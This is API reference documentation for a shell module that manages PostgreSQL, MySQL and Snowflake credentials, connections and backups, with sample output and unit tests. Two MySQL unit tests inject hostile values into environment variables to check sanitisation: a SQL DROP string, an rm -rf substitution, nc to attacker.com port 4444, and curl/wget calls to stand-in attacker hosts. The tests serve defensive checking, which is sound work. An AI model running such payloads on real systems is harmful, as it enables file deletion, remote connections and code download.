Database Functions API Reference
=================================

This module provides secure database connection management with integrated credential storage for PostgreSQL, MySQL, Snowflake, and other database systems. It maintains backward compatibility while adding modern security features.

.. note::
   All database functions integrate with the credential management system for secure password storage and retrieval across sessions.

PostgreSQL Functions
-------------------

setup_postgres_credentials()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Function Definition:**

Configure PostgreSQL connection credentials with secure storage and interactive setup options.

.. code-block:: bash

   setup_postgres_credentials [--interactive]

**Examples and Elaboration:**

PostgreSQL connection uses standard environment variables with secure credential management:

.. code-block:: bash

   # Basic credential setup (uses existing PGPASSWORD or credential store)
   setup_postgres_credentials
   # Output:
   # 🐘 PostgreSQL Credential Setup
   # 
   # Host: localhost
   # User: dheerajchand
   # Port: 5432
   # Database: gis
   # 
   # ✅ PostgreSQL credentials loaded from secure storage

   # Interactive setup (prompts for password)
   setup_postgres_credentials --interactive
   # Output:
   # 🐘 PostgreSQL Credential Setup
   # 
   # Host: localhost
   # User: dheerajchand
   # Port: 5432
   # Database: gis
   # 
   # Enter PostgreSQL password for dheerajchand@localhost:
   # [Password prompt - hidden input]
   # Store password securely? (y/n): y
   # 🔐 Password stored securely for future use
   # ✅ PostgreSQL credentials configured

Environment variables used:

.. code-block:: bash

   export PGHOST="${PGHOST:-localhost}"      # Database host
   export PGUSER="${PGUSER:-dheerajchand}"   # Database user
   export PGPORT="${PGPORT:-5432}"           # Database port
   export PGDATABASE="${PGDATABASE:-gis}"    # Default database
   export PGPASSWORD="[secured]"             # Password (set by function)

Credential resolution order:

1. **Existing PGPASSWORD**: If already set, uses current value
2. **Credential Store**: Retrieves from secure credential backend
3. **Interactive Prompt**: Prompts user if `--interactive` flag used
4. **Graceful Fallback**: Returns without error if no credentials available

**Unit Tests:**

.. code-block:: bash

   # Test: Credential setup with existing password
   test_postgres_credentials_existing() {
       export PGPASSWORD="test123"
       setup_postgres_credentials
       [[ "$PGPASSWORD" == "test123" ]]
   }
   
   # Test: Environment variables are set
   test_postgres_env_vars() {
       setup_postgres_credentials
       [[ -n "$PGHOST" ]] && [[ -n "$PGUSER" ]] && [[ -n "$PGPORT" ]]
   }
   
   # Test: Function handles missing credentials gracefully
   test_postgres_credentials_missing() {
       unset PGPASSWORD
       setup_postgres_credentials >/dev/null 2>&1
       [[ $? -eq 0 ]]  # Should not fail
   }

pg_connect()
~~~~~~~~~~~

**Function Definition:**

Establish PostgreSQL connection with automatic credential setup and connection testing.

.. code-block:: bash

   pg_connect [database] [--test]

**Examples and Elaboration:**

.. code-block:: bash

   # Connect to default database
   pg_connect
   # Output:
   # 🐘 Connecting to PostgreSQL...
   # 🔗 Connection: dheerajchand@localhost:5432/gis
   # ✅ Connected successfully
   # psql (15.4)
   # gis=#

   # Connect to specific database
   pg_connect analytics
   # Output:
   # 🐘 Connecting to PostgreSQL database: analytics
   # 🔗 Connection: dheerajchand@localhost:5432/analytics
   # ✅ Connected successfully
   # analytics=#

   # Test connection without opening psql
   pg_connect --test
   # Output:
   # 🐘 Testing PostgreSQL connection...
   # 🔗 Host: localhost:5432
   # 👤 User: dheerajchand
   # 🗄️ Database: gis
   # ✅ Connection successful!

   # Connection failure handling
   pg_connect nonexistent_db
   # Output:
   # 🐘 Connecting to PostgreSQL database: nonexistent_db
   # ❌ Connection failed: database "nonexistent_db" does not exist
   # 💡 Available databases:
   #    • gis
   #    • postgres  
   #    • template1

Connection process:

1. **Credential Setup**: Calls `setup_postgres_credentials` if needed
2. **Connection Test**: Verifies connectivity before opening psql
3. **Error Handling**: Provides helpful error messages and suggestions
4. **Database List**: Shows available databases on connection failure

**Unit Tests:**

.. code-block:: bash

   # Test: Connection function exists
   test_pg_connect_function() {
       type pg_connect >/dev/null 2>&1
   }
   
   # Test: Connection test mode
   test_pg_connect_test_mode() {
       # Mock successful connection test
       pg_connect --test >/dev/null 2>&1
       # Function should execute without error
       [[ $? -eq 0 ]]
   }

pg_status()
~~~~~~~~~~

**Function Definition:**

Display comprehensive PostgreSQL server status, connection information, and database statistics.

.. code-block:: bash

   pg_status()

**Examples and Elaboration:**

.. code-block:: bash

   pg_status
   # Output:
   # 🐘 PostgreSQL Status
   # ===================
   # 
   # Connection Configuration:
   #   Host: localhost:5432
   #   User: dheerajchand
   #   Database: gis
   #   SSL Mode: prefer
   # 
   # Server Status:
   #   ✅ Server: Running
   #   Version: PostgreSQL 15.4
   #   Uptime: 2 days, 14:23:45
   #   Max Connections: 100
   #   Active Connections: 3
   # 
   # Database Information:
   #   Total Databases: 4
   #   Current DB Size: 2.3 GB
   #   Available Space: 45.7 GB
   # 
   # Recent Activity:
   #   Active Queries: 1
   #   Idle Connections: 2
   #   Last Query: SELECT * FROM users WHERE...

When server is not running:

.. code-block:: bash

   pg_status
   # Output:
   # 🐘 PostgreSQL Status
   # ===================
   # 
   # ❌ Server: Not running or not accessible
   # 
   # Connection Configuration:
   #   Host: localhost:5432
   #   User: dheerajchand
   #   Database: gis
   # 
   # 💡 Troubleshooting:
   #   • Check if PostgreSQL is installed
   #   • Verify server is running: brew services start postgresql
   #   • Check connection settings

**Unit Tests:**

.. code-block:: bash

   # Test: Status function execution
   test_pg_status_execution() {
       pg_status >/dev/null 2>&1
       [[ $? -eq 0 ]]
   }

MySQL Functions
--------------

setup_mysql_credentials()
~~~~~~~~~~~~~~~~~~~~~~~~~

**Function Definition:**

Configure MySQL connection credentials with secure storage and multiple authentication methods.

.. code-block:: bash

   setup_mysql_credentials [--interactive] [--host host] [--user user]

**Examples and Elaboration:**

.. code-block:: bash

   # Basic MySQL credential setup
   setup_mysql_credentials
   # Output:
   # 🐬 MySQL Credential Setup
   # 
   # Host: localhost:3306
   # User: root
   # Database: mysql
   # 
   # ✅ MySQL credentials loaded from secure storage

   # Custom host and user
   setup_mysql_credentials --host db.company.com --user app_user
   # Output:
   # 🐬 MySQL Credential Setup
   # 
   # Host: db.company.com:3306
   # User: app_user
   # Database: mysql
   # 
   # Enter MySQL password for app_user@db.company.com:
   # [Password prompt]
   # Store password securely? (y/n): y

Environment variables configured:

.. code-block:: bash

   export MYSQL_HOST="${MYSQL_HOST:-localhost}"
   export MYSQL_USER="${MYSQL_USER:-root}"
   export MYSQL_PORT="${MYSQL_PORT:-3306}"
   export MYSQL_DATABASE="${MYSQL_DATABASE:-mysql}"
   export MYSQL_PWD="[secured]"  # MySQL's standard password variable

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: MySQL injection and credential security
   test_mysql_credentials_injection_security() {
       # Test SQL injection attempts in credentials
       export MYSQL_USER="admin'; DROP DATABASE test; --"
       export MYSQL_HOST="localhost\$(rm -rf /tmp/mysql_attack)"
       export MYSQL_DATABASE="test\`nc attacker.com 4444\`"

       setup_mysql_credentials >/dev/null 2>&1

       # Verify no commands executed
       assert_false "[ -f '/tmp/mysql_attack' ]" "Should not execute commands from MYSQL_HOST"

       # Verify credentials are sanitized for use
       local mysql_cmd_safe=true
       if command -v mysql >/dev/null 2>&1; then
           # Test that credentials can't be used for injection
           mysql --user="$MYSQL_USER" --host="$MYSQL_HOST" --execute="SELECT 1;" 2>/dev/null && mysql_cmd_safe=false
       fi
       assert_true "$mysql_cmd_safe" "MySQL credentials should be safe from injection"
   }

mysql_connect()
~~~~~~~~~~~~~~

**Function Definition:**

Establish MySQL connection with automatic credential resolution and connection testing.

.. code-block:: bash

   mysql_connect [database] [--test]

**Examples and Elaboration:**

.. code-block:: bash

   # Connect to MySQL
   mysql_connect
   # Output:
   # 🐬 Connecting to MySQL...
   # 🔗 Connection: root@localhost:3306/mysql
   # ✅ Connected successfully
   # mysql>

   # Test MySQL connection
   mysql_connect --test
   # Output:
   # 🐬 Testing MySQL connection...
   # 🔗 Host: localhost:3306
   # 👤 User: root
   # 🗄️ Database: mysql
   # 📊 Server Version: 8.0.34
   # ✅ Connection successful!

**Unit Tests:**

.. code-block:: bash

   # HOSTILE TEST: MySQL connection parameter validation
   test_mysql_connect_parameter_validation() {
       # Mock mysql to capture connection attempts
       local connection_attempts=()
       mysql() {
           connection_attempts+=("$@")
           return 1  # Mock connection failure
       }

       # Test malicious connection parameters
       export MYSQL_HOST="db.evil.com; curl attacker.com/steal"
       export MYSQL_USER="user\$(wget malicious.com/script)"
       export MYSQL_DATABASE="app\`id > /tmp/mysql_id\`"

       mysql_connect >/dev/null 2>&1

       # Verify malicious parameters were not executed
       assert_false "[ -f '/tmp/mysql_id' ]" "Should not execute backticks from database name"

       # Verify parameters are properly escaped when passed to mysql
       for arg in "${connection_attempts[@]}"; do
           assert_false "[[ '$arg' =~ 'curl attacker' ]]" "Should not pass curl commands to mysql"
           assert_false "[[ '$arg' =~ '\$(' ]]" "Should not pass unescaped command substitution"
       done

       unset -f mysql
   }

Snowflake Functions
------------------

setup_snowflake_credentials()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Function Definition:**

Configure Snowflake connection with account, warehouse, and role management for data warehouse operations.

.. code-block:: bash

   setup_snowflake_credentials [--account account] [--warehouse warehouse] [--interactive]

**Examples and Elaboration:**

.. code-block:: bash

   # Interactive Snowflake setup
   setup_snowflake_credentials --interactive
   # Output:
   # ❄️ Snowflake Credential Setup
   # 
   # Enter Snowflake account identifier: mycompany.us-west-2
   # Enter username: data_analyst
   # Enter password: [hidden]
   # Enter warehouse (optional): COMPUTE_WH
   # Enter database (optional): ANALYTICS_DB
   # Enter role (optional): DATA_ANALYST_ROLE
   # 
   # Store credentials securely? (y/n): y
   # 🔐 Snowflake credentials stored securely
   # ✅ Snowflake configuration complete

   # Using existing configuration
   setup_snowflake_credentials
   # Output:
   # ❄️ Snowflake Credential Setup
   # 
   # Account: mycompany.us-west-2
   # User: data_analyst
   # Warehouse: COMPUTE_WH
   # Database: ANALYTICS_DB
   # Role: DATA_ANALYST_ROLE
   # 
   # ✅ Snowflake credentials loaded from secure storage

Environment variables configured:

.. code-block:: bash

   export SNOWFLAKE_ACCOUNT="mycompany.us-west-2"
   export SNOWFLAKE_USER="data_analyst"
   export SNOWFLAKE_PASSWORD="[secured]"
   export SNOWFLAKE_WAREHOUSE="COMPUTE_WH"
   export SNOWFLAKE_DATABASE="ANALYTICS_DB" 
   export SNOWFLAKE_ROLE="DATA_ANALYST_ROLE"

**Unit Tests:**

.. code-block:: bash

   # Test: Snowflake credentials setup
   test_snowflake_credentials() {
       setup_snowflake_credentials
       [[ -n "$SNOWFLAKE_ACCOUNT" ]]
   }

snowflake_connect()
~~~~~~~~~~~~~~~~~~

**Function Definition:**

Connect to Snowflake with automatic session management and query execution capabilities.

.. code-block:: bash

   snowflake_connect [--query "SQL"] [--database database] [--warehouse warehouse]

**Examples and Elaboration:**

.. code-block:: bash

   # Interactive Snowflake connection
   snowflake_connect
   # Output:
   # ❄️ Connecting to Snowflake...
   # 🔗 Account: mycompany.us-west-2
   # 🏢 Warehouse: COMPUTE_WH
   # 🗄️ Database: ANALYTICS_DB
   # 👤 Role: DATA_ANALYST_ROLE
   # ✅ Connected successfully
   # ANALYTICS_DB.PUBLIC>

   # Execute query directly
   snowflake_connect --query "SELECT COUNT(*) FROM customers;"
   # Output:
   # ❄️ Executing Snowflake query...
   # COUNT(*)
   # 1,234,567
   # ✅ Query executed successfully

   # Use specific warehouse
   snowflake_connect --warehouse LARGE_WH --database SALES_DB
   # Output:
   # ❄️ Connecting with custom configuration...
   # 🏢 Warehouse: LARGE_WH
   # 🗄️ Database: SALES_DB
   # ✅ Connected successfully

**Unit Tests:**

.. code-block:: bash

   # Test: Snowflake connect function
   test_snowflake_connect_function() {
       type snowflake_connect >/dev/null 2>&1
   }

General Database Functions
-------------------------

db_list_connections()
~~~~~~~~~~~~~~~~~~~~

**Function Definition:**

List all configured database connections with their status and connection details.

.. code-block:: bash

   db_list_connections()

**Examples and Elaboration:**

.. code-block:: bash

   db_list_connections
   # Output:
   # 🗄️ Database Connections
   # =======================
   # 
   # PostgreSQL:
   #   ✅ Production: dheerajchand@localhost:5432/gis
   #   🔍 Test: Available (credentials stored)
   # 
   # MySQL:
   #   ✅ Local: root@localhost:3306/mysql
   #   ❌ Remote: Connection failed (timeout)
   # 
   # Snowflake:
   #   ✅ Analytics: mycompany.us-west-2 (COMPUTE_WH)
   #   🔒 Credentials: Stored securely
   # 
   # Summary:
   #   Active: 3
   #   Available: 1
   #   Failed: 1

**Unit Tests:**

.. code-block:: bash

   # Test: List connections function
   test_db_list_connections() {
       db_list_connections >/dev/null 2>&1
       [[ $? -eq 0 ]]
   }

db_test_all()
~~~~~~~~~~~~

**Function Definition:**

Test connectivity to all configured databases and report status with performance metrics.

.. code-block:: bash

   db_test_all [--timeout seconds]

**Examples and Elaboration:**

.. code-block:: bash

   # Test all database connections
   db_test_all
   # Output:
   # 🔍 Testing All Database Connections
   # ==================================
   # 
   # PostgreSQL (localhost:5432):
   #   ✅ Connection: Success (127ms)
   #   📊 Server: PostgreSQL 15.4
   #   🗄️ Database: gis (2.3GB)
   # 
   # MySQL (localhost:3306):
   #   ✅ Connection: Success (89ms)
   #   📊 Server: MySQL 8.0.34
   #   🗄️ Database: mysql (45MB)
   # 
   # Snowflake (mycompany.us-west-2):
   #   ✅ Connection: Success (2.1s)
   #   📊 Warehouse: COMPUTE_WH (Running)
   #   🗄️ Database: ANALYTICS_DB
   # 
   # Summary:
   #   ✅ Successful: 3/3
   #   📈 Average Response: 842ms
   #   🎯 All systems operational

   # Test with custom timeout
   db_test_all --timeout 5
   # Output:
   # 🔍 Testing with 5s timeout...
   # [Connection tests with 5 second timeout]

**Unit Tests:**

.. code-block:: bash

   # Test: Database test function
   test_db_test_all() {
       db_test_all >/dev/null 2>&1
       [[ $? -eq 0 ]]
   }

Backup and Maintenance Functions
-------------------------------

pg_backup()
~~~~~~~~~~

**Function Definition:**

Create PostgreSQL database backups with compression and automatic naming.

.. code-block:: bash

   pg_backup [database] [--output path] [--compress]

**Examples and Elaboration:**

.. code-block:: bash

   # Backup default database
   pg_backup
   # Output:
   # 🐘 PostgreSQL Backup
   # ==================
   # 
   # Source: gis@localhost:5432
   # Target: gis_backup_20241204_143022.sql
   # 
   # 📊 Backup Progress:
   #   [####################] 100%
   # 
   # ✅ Backup completed successfully!
   # 📁 File: gis_backup_20241204_143022.sql (23.4 MB)
   # ⏱️  Duration: 2m 34s

   # Compressed backup of specific database
   pg_backup analytics --compress --output ~/backups/
   # Output:
   # 🐘 PostgreSQL Backup (Compressed)
   # ================================
   # 
   # Source: analytics@localhost:5432
   # Target: ~/backups/analytics_backup_20241204_143127.sql.gz
   # 
   # 📊 Backup Progress:
   #   [####################] 100%
   # 
   # ✅ Backup completed successfully!
   # 📁 File: analytics_backup_20241204_143127.sql.gz (5.2 MB)
   # 💾 Compression: 78% reduction
   # ⏱️  Duration: 1m 12s

**Unit Tests:**

.. code-block:: bash

   # Test: Backup function exists
   test_pg_backup_function() {
       type pg_backup >/dev/null 2>&1
   }

Aliases and Shortcuts
--------------------

The module provides convenient aliases for all major database operations:

.. code-block:: bash

   # PostgreSQL shortcuts
   pg               # pg_connect (connect to default database)
   pgtest           # pg_connect --test
   pgstatus         # pg_status
   pgbackup         # pg_backup
   
   # MySQL shortcuts  
   my               # mysql_connect
   mytest           # mysql_connect --test
   mystatus         # mysql_status
   
   # Snowflake shortcuts
   sf               # snowflake_connect
   sftest           # snowflake_connect --test
   
   # General database shortcuts
   dblist           # db_list_connections
   dbtest           # db_test_all
   dbstatus         # db_status_all

Complete Usage Examples
----------------------

**Example 1: Initial database setup**

.. code-block:: bash

   # Setup PostgreSQL credentials interactively
   setup_postgres_credentials --interactive
   
   # Test the connection
   pg_connect --test
   
   # Connect and work
   pg_connect
   # gis=# CREATE TABLE users (...);
   # gis=# \q

**Example 2: Multiple database environment**

.. code-block:: bash

   # Setup multiple databases
   setup_postgres_credentials --interactive
   setup_mysql_credentials --host prod-mysql.company.com --user app_user --interactive
   setup_snowflake_credentials --account company.us-west-2 --interactive
   
   # Test all connections
   db_test_all
   
   # List available connections
   db_list_connections

**Example 3: Backup and maintenance workflow**

.. code-block:: bash

   # Check PostgreSQL status
   pg_status
   
   # Create compressed backup
   pg_backup production_db --compress --output ~/backups/
   
   # Test connection after maintenance
   pg_connect --test

**Example 4: Snowflake data analysis workflow**

.. code-block:: bash

   # Connect to Snowflake
   snowflake_connect --warehouse ANALYTICS_WH --database SALES_DB
   
   # Execute quick queries
   snowflake_connect --query "
   SELECT 
       DATE_TRUNC('month', order_date) as month,
       SUM(revenue) as total_revenue
   FROM orders 
   WHERE order_date >= '2024-01-01'
   GROUP BY 1
   ORDER BY 1;
   "

Integration with Credential System
--------------------------------

The database module integrates seamlessly with the credential management system:

.. code-block:: bash

   # Credentials are automatically stored and retrieved
   setup_postgres_credentials --interactive  # Stores password securely
   
   # Later sessions automatically load credentials
   pg_connect  # No password prompt needed
   
   # Manual credential operations
   store_credential "mysql" "app_user" "secret_password"
   password=$(get_credential "mysql" "app_user" "PASSWORD")

**Security Features:**

- **Encrypted Storage**: All passwords stored using system keychain/credential store
- **No Plain Text**: Passwords never stored in shell history or config files
- **Session Management**: Credentials loaded once per session
- **Backward Compatibility**: Works with existing PGPASSWORD/MYSQL_PWD workflows

Integration with Other Modules
-----------------------------

**With Docker Module:**

.. code-block:: bash

   # Start database containers
   docker_database postgres --init-sql schema.sql
   docker_database mysql --name dev-mysql
   
   # Connect to containerized databases
   export PGPORT=5432
   pg_connect

**With Python Module:**

.. code-block:: bash

   # Data science project with database
   ds_project_init analytics_project
   cd analytics_project
   
   # Setup database connections
   setup_postgres_credentials --interactive
   
   # Use in Python with environment variables
   py_env_switch uv
   python -c "import os; print(f'Connecting to {os.environ.get(\"PGHOST\")}:{os.environ.get(\"PGPORT\")}')"

This comprehensive database module provides secure, convenient access to multiple database systems with integrated credential management and development workflow optimization.